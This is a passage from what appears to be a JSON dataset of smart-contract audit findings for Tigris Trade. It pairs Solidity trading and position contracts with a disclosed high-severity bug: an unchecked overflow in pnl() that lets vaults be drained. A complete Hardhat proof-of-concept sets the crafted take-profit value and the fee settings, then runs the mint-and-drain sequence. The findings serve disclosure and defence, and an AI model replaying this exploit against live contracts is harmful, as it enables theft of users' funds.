minter\n    * @param _id position id\n    * @param _newMargin new margin amount\n    * @param _newPrice new entry price\n    */\n    function addToPosition(uint256 _id, uint256 _newMargin, uint256 _newPrice) external onlyMinter {\n        _trades[_id].margin = _newMargin;\n        _trades[_id].price = _newPrice;\n        initId[_id] = accInterestPerOi[_trades[_id].asset][_trades[_id].tigAsset][_trades[_id].direction]*int256(_newMargin*_trades[_id].leverage/1e18)/1e18;\n    }\n\n    /**\n    * @notice Called before updateFunding for reducing position or adding to position, to store accumulated funding\n    * @dev only callable by minter\n    * @param _id position id\n    */\n    function setAccInterest(uint256 _id) external onlyMinter {\n        _trades[_id].accInterest = trades(_id).accInterest;\n    }\n\n    /**\n    * @notice Reduces position size by %\n    * @dev only callable by minter\n    * @param _id position id\n    * @param _percent percent of a position being closed\n    */\n    function reducePosition(uint256 _id, uint256 _percent) external onlyMinter {\n        _trades[_id].accInterest -= _trades[_id].accInterest*int256(_percent)/int256(DIVISION_CONSTANT);\n        _trades[_id].margin -= _trades[_id].margin*_percent/DIVISION_CONSTANT;\n        initId[_id] = accInterestPerOi[_trades[_id].asset][_trades[_id].tigAsset][_trades[_id].direction]*int256(_trades[_id].margin*_trades[_id].leverage/1e18)/1e18;\n    }\n\n    /**\n    * @notice change a position tp price\n    * @dev only callable by minter\n    * @param _id position id\n    * @param _tpPrice tp price\n    */\n    function modifyTp(uint _id, uint _tpPrice) external onlyMinter {\n        _trades[_id].tpPrice = _tpPrice;\n    }\n\n    /**\n    * @notice change a position sl price\n    * @dev only callable by minter\n    * @param _id position id\n    * @param _slPrice sl price\n    */\n    function modifySl(uint _id, uint _slPrice) external onlyMinter {\n        _trades[_id].slPrice = _slPrice;\n    }\n\n    /**\n    * @dev Burns an NFT and it's data\n    * @param _id ID of the trade\n    */\n    function burn(uint _id) external onlyMinter {\n        _burn(_id);\n        uint _asset = _trades[_id].asset;\n        if (_trades[_id].orderType > 0) {\n            _limitOrderIndexes[_asset][_limitOrders[_asset][_limitOrders[_asset].length-1]] = _limitOrderIndexes[_asset][_id];\n            _limitOrders[_asset][_limitOrderIndexes[_asset][_id]] = _limitOrders[_asset][_limitOrders[_asset].length-1];\n            delete _limitOrderIndexes[_asset][_id];\n            _limitOrders[_asset].pop();            \n        } else {\n            _assetOpenPositionsIndexes[_asset][_assetOpenPositions[_asset][_assetOpenPositions[_asset].length-1]] = _assetOpenPositionsIndexes[_asset][_id];\n            _assetOpenPositions[_asset][_assetOpenPositionsIndexes[_asset][_id]] = _assetOpenPositions[_asset][_assetOpenPositions[_asset].length-1];\n            delete _assetOpenPositionsIndexes[_asset][_id];\n            _assetOpenPositions[_asset].pop();  \n\n            _openPositionsIndexes[_openPositions[_openPositions.length-1]] = _openPositionsIndexes[_id];\n            _openPositions[_openPositionsIndexes[_id]] = _openPositions[_openPositions.length-1];\n            delete _openPositionsIndexes[_id];\n            _openPositions.pop();              \n        }\n        delete _trades[_id];\n    }\n\n    function assetOpenPositionsLength(uint _asset) external view returns (uint256) {\n        return _assetOpenPositions[_asset].length;\n    }\n\n    function limitOrdersLength(uint _asset) external view returns (uint256) {\n        return _limitOrders[_asset].length;\n    }\n\n    function getCount() external view returns (uint) {\n        return _tokenIds.current();\n    }\n\n    function userTrades(address _user) external view returns (uint[] memory) {\n        uint[] memory _ids = new uint[](balanceOf(_user));\n        for (uint i=0; i<_ids.length; i++) {\n            _ids[i] = tokenOfOwnerByIndex(_user, i);\n        }\n        return _ids;\n    }\n\n    function openPositionsSelection(uint _from, uint _to) external view returns (uint[] memory) {\n        uint[] memory _ids = new uint[](_to-_from);\n        for (uint i=0; i<_ids.length; i++) {\n            _ids[i] = _openPositions[i+_from];\n        }\n        return _ids;\n    }\n\n    function setMinter(address _minter, bool _bool) external onlyOwner {\n        _isMinter[_minter] = _bool;\n    }    \n\n    modifier onlyMinter() {\n        require(_isMinter[_msgSender()], \"!Minter\");\n        _;\n    }\n\n    // META-TX\n    function _msgSender() internal view override(Context, MetaContext) returns (address sender) {\n        return MetaContext._msgSender();\n    }\n    function _msgData() internal view override(Context, MetaContext) returns (bytes calldata) {\n        return MetaContext._msgData();\n    }\n}\n\n//SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/utils/cryptography/ECDSA.sol\";\nimport \"../interfaces/IPosition.sol\";\n\ninterface IPrice {\n    function latestAnswer() external view returns (int256);\n    function decimals() external view returns (uint256);\n}\n\nstruct PriceData {\n    address provider;\n    uint256 asset;\n    uint256 price;\n    uint256 spread;\n    uint256 timestamp;\n    bool isClosed;\n}\n\nlibrary TradingLibrary {\n\n    using ECDSA for bytes32;\n\n    /**\n    * @notice returns position profit or loss\n    * @param _direction true if long\n    * @param _currentPrice current price\n    * @param _price opening price\n    * @param _leverage position leverage\n    * @param _margin collateral amount\n    * @param accInterest funding fees\n    * @return _positionSize position size\n    * @return _payout payout trader should get\n    */\n    function pnl(bool _direction, uint _currentPrice, uint _price, uint _margin, uint _leverage, int256 accInterest) external pure returns (uint256 _positionSize, int256 _payout) {\n        unchecked {\n            uint _initPositionSize = _margin * _leverage / 1e18;\n            if (_direction && _currentPrice >= _price) {\n                _payout = int256(_margin) + int256(_initPositionSize * (1e18 * _currentPrice / _price - 1e18)/1e18) + accInterest;\n            } else if (_direction && _currentPrice < _price) {\n                _payout = int256(_margin) - int256(_initPositionSize * (1e18 - 1e18 * _currentPrice / _price)/1e18) + accInterest;\n            } else if (!_direction && _currentPrice <= _price) {\n                _payout = int256(_margin) + int256(_initPositionSize * (1e18 - 1e18 * _currentPrice / _price)/1e18) + accInterest;\n            } else {\n                _payout = int256(_margin) - int256(_initPositionSize * (1e18 * _currentPrice / _price - 1e18)/1e18) + accInterest;\n            }\n            _positionSize = _initPositionSize * _currentPrice / _price;\n        }\n    }\n\n    /**\n    * @notice returns position liquidation price\n    * @param _direction true if long\n    * @param _tradePrice opening price\n    * @param _leverage position leverage\n    * @param _margin collateral amount\n    * @param _accInterest funding fees\n    * @param _liqPercent liquidation percent\n    * @return _liqPrice liquidation price\n    */\n    function liqPrice(bool _direction, uint _tradePrice, uint _leverage, uint _margin, int _accInterest, uint _liqPercent) public pure returns (uint256 _liqPrice) {\n        if (_direction) {\n            _liqPrice = _tradePrice - ((_tradePrice*1e18/_leverage) * uint(int(_margin)+_accInterest) / _margin) * _liqPercent / 1e10;\n        } else {\n            _liqPrice = _tradePrice + ((_tradePrice*1e18/_leverage) * uint(int(_margin)+_accInterest) / _margin) * _liqPercent / 1e10;\n        }\n    }\n\n    /**\n    * @notice uses liqPrice() and returns position liquidation price\n    * @param _positions positions contract address\n    * @param _id position id\n    * @param _liqPercent liquidation percent\n    */\n    function getLiqPrice(address _positions, uint _id, uint _liqPercent) external view returns (uint256) {\n        IPosition.Trade memory _trade = IPosition(_positions).trades(_id);\n        return liqPrice(_trade.direction, _trade.price, _trade.leverage, _trade.margin, _trade.accInterest, _liqPercent);\n    }\n\n    /**\n    * @notice verifies that price is signed by a whitelisted node\n    * @param _validSignatureTimer seconds allowed before price is old\n    * @param _asset position asset\n    * @param _chainlinkEnabled is chainlink verification is on\n    * @param _chainlinkFeed address of chainlink price feed\n    * @param _priceData PriceData object\n    * @param _signature signature returned from oracle\n    * @param _isNode mapping of allowed nodes\n    */\n    function verifyPrice(\n        uint256 _validSignatureTimer,\n        uint256 _asset,\n        bool _chainlinkEnabled,\n        address _chainlinkFeed,\n        PriceData calldata _priceData,\n        bytes calldata _signature,\n        mapping(address => bool) storage _isNode\n    )\n        external view\n    {\n        address _provider = (\n            keccak256(abi.encode(_priceData))\n        ).toEthSignedMessageHash().recover(_signature);\n        require(_provider == _priceData.provider, \"BadSig\");\n        require(_isNode[_provider], \"!Node\");\n        require(_asset == _priceData.asset, \"!Asset\");\n        require(!_priceData.isClosed, \"Closed\");\n        require(block.timestamp >= _priceData.timestamp, \"FutSig\");\n        require(block.timestamp <= _priceData.timestamp + _validSignatureTimer, \"ExpSig\");\n        require(_priceData.price > 0, \"NoPrice\");\n        if (_chainlinkEnabled && _chainlinkFeed != address(0)) {\n            int256 assetChainlinkPriceInt = IPrice(_chainlinkFeed).latestAnswer();\n            if (assetChainlinkPriceInt != 0) {\n                uint256 assetChainlinkPrice = uint256(assetChainlinkPriceInt) * 10**(18 - IPrice(_chainlinkFeed).decimals());\n                require(\n                    _priceData.price < assetChainlinkPrice+assetChainlinkPrice*2/100 &&\n                    _priceData.price > assetChainlinkPrice-assetChainlinkPrice*2/100, \"!chainlinkPrice\"\n                );\n            }\n        }\n    }\n}\n\n\n",
        "CodeNames": [
            "BondNFT.sol",
            "NFTSale.sol",
            "Trading.sol",
            "Position.sol",
            "TradingLibrary.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-03",
                "Location": [
                    "referralFees",
                    "_price",
                    "initiateLimitOrder()",
                    "_positionSize",
                    "_initPositionSize * _currentPrice",
                    "_handleCloseFees()",
                    "unchecked",
                    "executeLimitOrder()",
                    "_payout",
                    "_currentPrice",
                    "pnl()",
                    "daoFees =",
                    "limitClose()"
                ],
                "Type": " Certain fee configuration enables vaults to be drained",
                "Description": "*Submitted by Bobface(https://github.com/code-423n4/2022-12-tigris-findings/issues/86)*\n\nAn overflow in TradingLibrary.pnl() enables all funds from the vault contracts to be drained given a certain fee configuration is present.\n\n\nWhen opening a position, any value can be passed as take-profit price. This value is later used in the PNL calculation in an unchecked block. Setting this value specifically to attack the vault leads to the Trading contract minting a huge (in the example below 10^36) Tigris tokens, which can then be given to the vault to withdraw assets.\n\nThe exploiter starts by setting himself as referrer, in order to later receive the referrer fees.\n\nThe next step is to open a short position at the current market price by calling initiateLimitOrder(). Here, the malicious value which will later bring the arithmetic to overflow is passed in as take-profit price. For the example below, the value has been calculated by hand to be 115792089237316195423570985008687907854269984665640564039467 for this specific market price, leverage and margin.\n\nThe order is then immediately executed through executeLimitOrder().\n\nThe final step is to close the order through limitClose(), which will then mint over 10^36 Tigris tokens to the attacker.\n\n\nThe bug takes place in TradingLibrary.pnl(), line 46. The function is called during the process of closing the order to calculate the payout and position size. The malicious take-profit is passed as _currentPrice and the order's original opening price is passed as _price. The take-profit has been specifically calculated so that 1e18 * _currentPrice / _price 1e18 results in 0, meaning _payout = _margin (accInterest is negligible for this PoC).\nLine 48 then calculates the position size. Margin and leverage have been chosen so that _initPositionSize * _currentPrice does not overflow, resulting in a huge _positionSize which is returned from the function.\n\nLater, Trading._handleCloseFees() is called, under the condition that _payout  0, which is why the overflow had to be calculated so precisely, as to not subtract from the _payout but still create a large _positionSize. _positionSize is passed in to this function, and it is used to calculate DAO and referral fees. Line 805 is what requires the specific fee configuration to be present, as otherwise this line would revert. The fees have to be daoFees = 2*referralFees -not exactly, but close to this relationship. Then line 792 will set the DAO fees close to zero, while the huge referralFees are directly minted and not included in the calculation in line 805.\n\n",
                "Repair": "\nThe core issue is that the arithmetic in TradingLibrary.pnl() overflows. I recommend removing the unchecked block.\n\n### Proof of Concept\n\nInsert the following code as test into test/07.Trading.js and run it with npx hardhat test test/07.Trading.js:\n\njavascript\ndescribe(\"PoC\", function () {\n    it.only(\"PoC\", async function () {\n      // Setup token balances and approvals\n      const mockDAI = await ethers.getContractAt(\"MockERC20\", MockDAI.address)\n      await mockDAI.connect(owner).transfer(user.address, parseEther(\"10000\"))\n      await mockDAI.connect(user).approve(trading.address, parseEther(\"10000\"))\n      const permitData = \n        \"0\",\n        \"0\",\n        \"0\",\n        \"0x0000000000000000000000000000000000000000000000000000000000000000\",\n        \"0x0000000000000000000000000000000000000000000000000000000000000000\",\n        false\n      ]\n\n      // Create referral code\n      await referrals.connect(user).createReferralCode(ethers.constants.HashZero)\n\n      // Set the fees\n      await trading.connect(owner).setFees(\n        false,        // close\n        \"200000000\",  // dao  \n        \"0\",          // burn\n        \"100000000\",  // referral\n        \"0\",          // bot\n        \"0\",          // percent\n      )\n\n\n      // ============================================================== //\n      // =================== Create the limit order =================== //\n      // ============================================================== //\n      const tradeInfo = \n        parseEther(\"1\"),          // margin amount\n        MockDAI.address,          // margin asset\n        StableVault.address,      // stable vault\n        parseEther(\"2\"),          // leverage\n        0,                        // asset id\n        false,                    // direction (short)\n        \"115792089237316195423570985008687907854269984665640564039467\",          // take profit price\n        parseEther(\"0\"),       // stop loss price\n        ethers.constants.HashZero // referral (ourself)\n      ];\n\n      // Create the order\n      await trading.connect(user).initiateLimitOrder(\n        tradeInfo,            // trade info\n        1,                    // order type (limit)\n        parseEther(\"1000\"),   // price\n        permitData,           // permit\n        user.address          // trader\n      )\n\n\n      // ============================================================== //\n      // =================== Execute the limit order ================== //\n      // ============================================================== //\n\n      // Wait for some blocks to pass the delay\n      await network.provider.send(\"evm_increaseTime\", 10])\n      await network.provider.send(\"evm_mine\")\n\n      // Create the price data\n      let priceData = \n        node.address,                                   // provider\n        0,                                              // asset id\n        parseEther(\"1000\"),                             // price\n        10000000,                                       // spread (0.1%)\n        (await ethers.provider.getBlock()).timestamp,   // timestamp\n        false                                           // is closed\n      ]\n\n      // Sign the price data\n      let message = ethers.utils.keccak256(\n        ethers.utils.defaultAbiCoder.encode(\n          'address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],\n          priceData[0], priceData[1], priceData[2], priceData[3], priceData[4], priceData[5]]\n        )\n      );\n      let sig = await node.signMessage(\n        Buffer.from(message.substring(2), 'hex')\n      )\n\n      // Execute the limit order\n      await trading.connect(user).executeLimitOrder(1, priceData, sig);\n\n\n\n\n\n      // ============================================================== //\n      // ======================== Close order  ======================== //\n      // ============================================================== //\n\n      // Wait for some blocks to pass the delay\n      await network.provider.send(\"evm_increaseTime\", 10])\n      await network.provider.send(\"evm_mine\")\n\n      // Close order\n      await trading.connect(user).limitClose(\n        1,          // id\n        true,       // take profit\n        priceData,  // price data\n        sig,        // signature\n      )\n\n      // Print results\n      const amount = await stabletoken.balanceOf(user.address)\n      const tenPow18 = \"1000000000000000000\"\n      console.log(StableToken balance at end: ${(amount / tenPow18).toString()})\n    })\n})\n\n\nTriHaz (Tigris Trade) confirmed(https://github.com/code-423n4/2022-12-tigris-findings/issues/86)\n\nAlex the Entreprenerd (judge) commented(https://github.com/code-423n4/2022-12-tigris-findings/issues/86#issuecomment-1399443161):\n  In contrast to other reports that have some ambiguity, this report has shown a way to undercollateralize the vault and steal effectively all value.\n\n  The Warden has shown how, by leveraging unchecked math and using injected-inputs, it's possible to effectively mint an infinite amount of Stable Tokens.\n \n Mitigation will require ensuring that user provided inputs do not allow for overflows.\n\nGainsGoblin (Tigris Trade) resolved(https://github.com/code-423n4/2022-12-tigris-findings/issues/86#issuecomment-1407133086):\n  Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419173668\n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol\";\nimport \"@openzeppelin/contracts/utils/Counters.sol\";\nimport \"./utils/MetaContext.sol\";\nimport \"./interfaces/IPosition.sol\";\n\ncontract Position is ERC721Enumerable, MetaContext, IPosition {\n\n    function ownerOf(uint _id) public view override(ERC721, IERC721, IPosition) returns (address) {\n        return ERC721.ownerOf(_id);\n    }\n\n    using Counters for Counters.Counter;\n    uint constant public DIVISION_CONSTANT = 1e10; // 100%\n\n    mapping(uint => mapping(address => uint)) public vaultFundingPercent;\n\n    mapping(address => bool) private _isMinter; // Trading contract should be minter\n    mapping(uint256 => Trade) private _trades; // NFT id to Trade\n\n    uint256[] private _openPositions;\n    mapping(uint256 => uint256) private _openPositionsIndexes;\n\n    mapping(uint256 => uint256[]) private _assetOpenPositions;\n    mapping(uint256 => mapping(uint256 => uint256)) private _assetOpenPositionsIndexes;\n\n    mapping(uint256 => uint256[]) private _limitOrders; // List of limit order nft ids per asset\n    mapping(uint256 => mapping(uint256 => uint256)) private _limitOrderIndexes; // Keeps track of asset -> id -> array index\n\n    // Funding\n    mapping(uint256 => mapping(address => int256)) public fundingDeltaPerSec;\n    mapping(uint256 => mapping(address => mapping(bool => int256))) private accInterestPerOi;\n    mapping(uint256 => mapping(address => uint256)) private lastUpdate;\n    mapping(uint256 => int256) private initId;\n    mapping(uint256 => mapping(address => uint256)) private longOi;\n    mapping(uint256 => mapping(address => uint256)) private shortOi;\n\n    function isMinter(address _address) public view returns (bool) { return _isMinter[_address]; }\n    function trades(uint _id) public view returns (Trade memory) {\n        Trade memory _trade = _trades[_id];\n        _trade.trader = ownerOf(_id);\n        if (_trade.orderType > 0) return _trade;\n        \n        int256 _pendingFunding;\n        if (_trade.direction && longOi[_trade.asset][_trade.tigAsset] > 0) {\n            _pendingFunding = (int256(block.timestamp-lastUpdate[_trade.asset][_trade.tigAsset])*fundingDeltaPerSec[_trade.asset][_trade.tigAsset])*1e18/int256(longOi[_trade.asset][_trade.tigAsset]);\n            if (longOi[_trade.asset][_trade.tigAsset] > shortOi[_trade.asset][_trade.tigAsset]) {\n                _pendingFunding = -_pendingFunding;\n            } else {\n                _pendingFunding = _pendingFunding*int256(1e10-vaultFundingPercent[_trade.asset][_trade.tigAsset])/1e10;\n            }\n        } else if (shortOi[_trade.asset][_trade.tigAsset] > 0) {\n            _pendingFunding = (int256(block.timestamp-lastUpdate[_trade.asset][_trade.tigAsset])*fundingDeltaPerSec[_trade.asset][_trade.tigAsset])*1e18/int256(shortOi[_trade.asset][_trade.tigAsset]);\n            if (shortOi[_trade.asset][_trade.tigAsset] > longOi[_trade.asset][_trade.tigAsset]) {\n                _pendingFunding = -_pendingFunding;\n            } else {\n                _pendingFunding = _pendingFunding*int256(1e10-vaultFundingPercent[_trade.asset][_trade.tigAsset])/1e10;\n            }\n        }\n        _trade.accInterest += (int256(_trade.margin*_trade.leverage/1e18)*(accInterestPerOi[_trade.asset][_trade.tigAsset][_trade.direction]+_pendingFunding)/1e18)-initId[_id];\n        \n        return _trade;\n    }\n    function openPositions() public view returns (uint256[] memory) { return _openPositions; }\n    function openPositionsIndexes(uint _id) public view returns (uint256) { return _openPositionsIndexes[_id]; }\n    function assetOpenPositions(uint _asset) public view returns (uint256[] memory) { return _assetOpenPositions[_asset]; }\n    function assetOpenPositionsIndexes(uint _asset, uint _id) public view returns (uint256) { return _assetOpenPositionsIndexes[_asset][_id]; }\n    function limitOrders(uint _asset) public view returns (uint256[] memory) { return _limitOrders[_asset]; }\n    function limitOrderIndexes(uint _asset, uint _id) public view returns (uint256) { return _limitOrderIndexes[_asset][_id]; }\n\n    Counters.Counter private _tokenIds;\n    string public baseURI;\n\n    constructor(string memory _setBaseURI, string memory _name, string memory _symbol) ERC721(_name, _symbol) {\n        baseURI = _setBaseURI;\n        _tokenIds.increment();\n    }\n\n    function _baseURI() internal override view returns (string memory) {\n        return baseURI;\n    }\n\n    function setBaseURI(string memory _newBaseURI) external onlyOwner {\n        baseURI = _newBaseURI;\n    }\n\n    /**\n    * @notice Update funding rate after open interest change\n    * @dev only callable by minter\n    * @param _asset pair id\n    * @param _tigAsset tigAsset token address\n    * @param _longOi long open interest\n    * @param _shortOi short open interest\n    * @param _baseFundingRate base funding rate of a pair\n    * @param _vaultFundingPercent percent of earned funding going to the stablevault\n    */\n    function updateFunding(uint256 _asset, address _tigAsset, uint256 _longOi, uint256 _shortOi, uint256 _baseFundingRate, uint _vaultFundingPercent) external onlyMinter {\n        if(longOi[_asset][_tigAsset] < shortOi[_asset][_tigAsset]) {\n            if (longOi[_asset][_tigAsset] > 0) {\n                accInterestPerOi[_asset][_tigAsset][true] += ((int256(block.timestamp-lastUpdate[_asset][_tigAsset])*fundingDeltaPerSec[_asset][_tigAsset])*1e18/int256(longOi[_asset][_tigAsset]))*int256(1e10-vaultFundingPercent[_asset][_tigAsset])/1e10;\n            }\n            accInterestPerOi[_asset][_tigAsset][false] -= (int256(block.timestamp-lastUpdate[_asset][_tigAsset])*fundingDeltaPerSec[_asset][_tigAsset])*1e18/int256(shortOi[_asset][_tigAsset]);\n\n        } else if(longOi[_asset][_tigAsset] > shortOi[_asset][_tigAsset]) {\n            accInterestPerOi[_asset][_tigAsset][true] -= (int256(block.timestamp-lastUpdate[_asset][_tigAsset])*fundingDeltaPerSec[_asset][_tigAsset])*1e18/int256(longOi[_asset][_tigAsset]);\n            if (shortOi[_asset][_tigAsset] > 0) {\n                accInterestPerOi[_asset][_tigAsset][false] += ((int256(block.timestamp-lastUpdate[_asset][_tigAsset])*fundingDeltaPerSec[_asset][_tigAsset])*1e18/int256(shortOi[_asset][_tigAsset]))*int256(1e10-vaultFundingPercent[_asset][_tigAsset])/1e10;\n            }\n        }\n        lastUpdate[_asset][_tigAsset] = block.timestamp;\n        int256 _oiDelta;\n        if (_longOi > _shortOi) {\n            _oiDelta = int256(_longOi)-int256(_shortOi);\n        } else {\n            _oiDelta = int256(_shortOi)-int256(_longOi);\n        }\n        \n        fundingDeltaPerSec[_asset][_tigAsset] = (_oiDelta*int256(_baseFundingRate)/int256(DIVISION_CONSTANT))/31536000;\n        longOi[_asset][_tigAsset] = _longOi;\n        shortOi[_asset][_tigAsset] = _shortOi;\n        vaultFundingPercent[_asset][_tigAsset] = _vaultFundingPercent;\n    }\n\n    /**\n    * @notice mint a new position nft\n    * @dev only callable by minter\n    * @param _mintTrade New trade params in struct\n    */\n    function mint(\n        MintTrade memory _mintTrade\n    ) external onlyMinter {\n        uint newTokenID = _tokenIds.current();\n\n        Trade storage newTrade = _trades[newTokenID];\n        newTrade.margin = _mintTrade.margin;\n        newTrade.leverage = _mintTrade.leverage;\n        newTrade.asset = _mintTrade.asset;\n        newTrade.direction = _mintTrade.direction;\n        newTrade.price = _mintTrade.price;\n        newTrade.tpPrice = _mintTrade.tp;\n        newTrade.slPrice = _mintTrade.sl;\n        newTrade.orderType = _mintTrade.orderType;\n        newTrade.id = newTokenID;\n        newTrade.tigAsset = _mintTrade.tigAsset;\n\n        _safeMint(_mintTrade.account, newTokenID);\n        if (_mintTrade.orderType > 0) {\n            _limitOrders[_mintTrade.asset].push(newTokenID);\n            _limitOrderIndexes[_mintTrade.asset][newTokenID] = _limitOrders[_mintTrade.asset].length-1;\n        } else {\n            initId[newTokenID] = accInterestPerOi[_mintTrade.asset][_mintTrade.tigAsset][_mintTrade.direction]*int256(_mintTrade.margin*_mintTrade.leverage/1e18)/1e18;\n            _openPositions.push(newTokenID);\n            _openPositionsIndexes[newTokenID] = _openPositions.length-1;\n\n            _assetOpenPositions[_mintTrade.asset].push(newTokenID);\n            _assetOpenPositionsIndexes[_mintTrade.asset][newTokenID] = _assetOpenPositions[_mintTrade.asset].length-1;\n        }\n        _tokenIds.increment();\n    }\n\n    /**\n     * @param _id id of the position NFT\n     * @param _price price used for execution\n     * @param _newMargin margin after fees\n     */\n    function executeLimitOrder(uint256 _id, uint256 _price, uint256 _newMargin) external onlyMinter {\n        Trade storage _trade = _trades[_id];\n        if (_trade.orderType == 0) {\n            return;\n        }\n        _trade.orderType = 0;\n        _trade.price = _price;\n        _trade.margin = _newMargin;\n        uint _asset = _trade.asset;\n        _limitOrderIndexes[_asset][_limitOrders[_asset][_limitOrders[_asset].length-1]] = _limitOrderIndexes[_asset][_id];\n        _limitOrders[_asset][_limitOrderIndexes[_asset][_id]] = _limitOrders[_asset][_limitOrders[_asset].length-1];\n        delete _limitOrderIndexes[_asset][_id];\n        _limitOrders[_asset].pop();\n\n        _openPositions.push(_id);\n        _openPositionsIndexes[_id] = _openPositions.length-1;\n        _assetOpenPositions[_asset].push(_id);\n        _assetOpenPositionsIndexes[_asset][_id] = _assetOpenPositions[_asset].length-1;\n\n        initId[_id] = accInterestPerOi[_trade.asset][_trade.tigAsset][_trade.direction]*int256(_trade.margin*_trade.leverage/1e18)/1e18;\n    }\n\n    /**\n    * @notice modifies margin and leverage\n    * @dev only callable by minter\n    * @param _id position id\n    * @param _newMargin new margin amount\n    * @param _newLeverage new leverage amount\n    */\n    function modifyMargin(uint256 _id, uint256 _newMargin, uint256 _newLeverage) external onlyMinter {\n        _trades[_id].margin = _newMargin;\n        _trades[_id].leverage = _newLeverage;\n    }\n\n    /**\n    * @notice modifies margin and entry price\n    * @dev only callable by minter\n    * @param _id position id\n    * @param _newMargin new margin amount\n    * @param _newPrice new entry price\n    */\n    function addToPosition(uint256 _id, uint256 _newMargin, uint256 _newPrice) external onlyMinter {\n        _trades[_id].margin = _newMargin;\n        _trades[_id].price = _newPrice;\n        initId[_id] = accInterestPerOi[_trades[_id].asset][_trades[_id].tigAsset][_trades[_id].direction]*int256(_newMargin*_trades[_id].leverage/1e18)/1e18;\n    }\n\n    /**\n    * @notice Called before updateFunding for reducing position or adding to position, to store accumulated funding\n    * @dev only callable by minter\n    * @param _id position id\n    */\n    function setAccInterest(uint256 _id) external onlyMinter {\n        _trades[_id].accInterest = trades(_id).accInterest;\n    }\n\n    /**\n    * @notice Reduces position size by %\n    * @dev only callable by minter\n    * @param _id position id\n    * @param _percent percent of a position being closed\n    */\n    function reducePosition(uint256 _id, uint256 _percent) external onlyMinter {\n        _trades[_id].accInterest -= _trades[_id].accInterest*int256(_percent)/int256(DIVISION_CONSTANT);\n        _trades[_id].margin -= _trades[_id].margin*_percent/DIVISION_CONSTANT;\n        initId[_id] = accInterestPerOi[_trades[_id].asset][_trades[_id].tigAsset][_trades[_id].direction]*int256(_trades[_id].margin*_trades[_id].leverage/1e18)/1e18;\n    }\n\n    /**\n    * @notice change a position tp price\n    * @dev only callable by minter\n    * @param _id position id\n    * @param _tpPrice tp price\n    */\n    function modifyTp(uint _id, uint _tpPrice) external onlyMinter {\n        _trades[_id].tpPrice = _tpPrice;\n    }\n\n    /**\n    * @notice change a position sl price\n    * @dev only callable by minter\n    * @param _id position id\n    * @param _slPrice sl price\n    */\n    function modifySl(uint _id, uint _slPrice) external onlyMinter {\n        _trades[_id].slPrice = _slPrice;\n    }\n\n    /**\n    * @dev Burns an NFT and it's data\n    * @param _id ID of the trade\n    */\n    function burn(uint _id) external onlyMinter {\n        _burn(_id);\n        uint _asset = _trades[_id].asset;\n        if (_trades[_id].orderType > 0) {\n            _limitOrderIndexes[_asset][_limitOrders[_asset][_limitOrders[_asset].length-1]] = _limitOrderIndexes[_asset][_id];\n            _limitOrders[_asset][_limitOrderIndexes[_asset][_id]] = _limitOrders[_asset][_limitOrders[_asset].length-1];\n            delete _limitOrderIndexes[_asset][_id];\n            _limitOrders[_asset].pop();            \n        } else {\n            _assetOpenPositionsIndexes[_asset][_assetOpenPositions[_asset][_assetOpenPositions[_asset].length-1]] = _assetOpenPositionsIndexes[_asset][_id];\n            _assetOpenPositions[_asset][_assetOpenPositionsIndexes[_asset][_id]] = _assetOpenPositions[_asset][_assetOpenPositions[_asset].length-1];\n            delete _assetOpenPositionsIndexes[_asset][_id];\n            _assetOpenPositions[_asset].pop();  \n\n            _openPositionsIndexes[_openPositions[_openPositions.length-1]] = _openPositionsIndexes[_id];\n            _openPositions[_openPositionsIndexes[_id]] = _openPositions[_openPositions.length-1];\n            delete _openPositionsIndexes[_id];\n            _openPositions.pop();              \n        }\n        delete _trades[_id];\n    }\n\n    function assetOpenPositionsLength(uint _asset) external view returns (uint256) {\n        return _assetOpenPositions[_asset].length;\n    }\n\n    function limitOrdersLength(uint _asset) external view returns (uint256) {\n        return _limitOrders[_asset].length;\n    }\n\n    function getCount() external view returns (uint) {\n        return _tokenIds.current();\n    }\n\n    function userTrades(address _user) external view returns (uint[] memory) {\n        uint[] memory _ids = new uint[](balanceOf(_user));\n        for (uint i=0; i<_ids.length; i++) {\n            _ids[i] = tokenOfOwnerByIndex(_user, i);\n        }\n        return _ids;\n    }\n\n    function openPositionsSelection(uint _from, uint _to) external view returns (uint[] memory) {\n        uint[] memory _ids = new uint[](_to-_from);\n        for (uint i=0; i<_ids.length; i++) {\n            _ids[i] = _openPositions[i+_from];\n        }\n        return _ids;\n    }\n\n    function setMinter(address _minter, bool _bool) external onlyOwner {\n        _isMinter[_minter] = _bool;\n    }    \n\n    modifier onlyMinter() {\n        require(_isMinter[_msgSender()], \"!Minter\");\n        _;\n    }\n\n    // META-TX\n    function _msgSender() internal view override(Context, MetaContext) returns (address sender) {\n        return MetaContext._msgSender();\n    }\n    function _msgData() internal view override(Context, MetaContext) returns (bytes calldata) {\n        return MetaContext._msgData();\n    }\n}\n\n",
        "CodeNames": [
            "Position.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-04",
                "Location": [
                    "\nconst { expect } = require(\"chai\");\nconst { deployments, ethers, waffle } = require(\"hardhat\");\nconst { parseEther, formatEther } = ethers.utils;\nconst { signERC2612Permit } = require('eth-permit');\nconst exp = require(\"constants\");\n\ndescribe(\"Design Specification: Maximum PnL is +500%\", function () {\n\n  let owner;\n  let node;\n  let user;\n  let node2;\n  let node3;\n  let proxy;\n\n  let Trading;\n  let trading;\n\n  let TradingExtension;\n  let tradingExtension;\n\n  let TradingLibrary;\n  let tradinglibrary;\n\n  let StableToken;\n  let stabletoken;\n\n  let StableVault;\n  let stablevault;\n\n  let position;\n\n  let pairscontract;\n  let referrals;\n\n  let permitSig;\n  let permitSigUsdc;\n\n  let MockDAI;\n  let mockdai;\n  let MockUSDC;\n  let mockusdc;\n\n  let badstablevault;\n\n  let chainlink;\n\n  beforeEach(async function () {\n    await deployments.fixture(['test']);\n    owner, node, user, node2, node3, proxy] = await ethers.getSigners();\n    StableToken = await deployments.get(\"StableToken\");\n    stabletoken = await ethers.getContractAt(\"StableToken\", StableToken.address);\n    Trading = await deployments.get(\"Trading\");\n    trading = await ethers.getContractAt(\"Trading\", Trading.address);\n    await trading.connect(owner).setMaxWinPercent(5e10);\n    TradingExtension = await 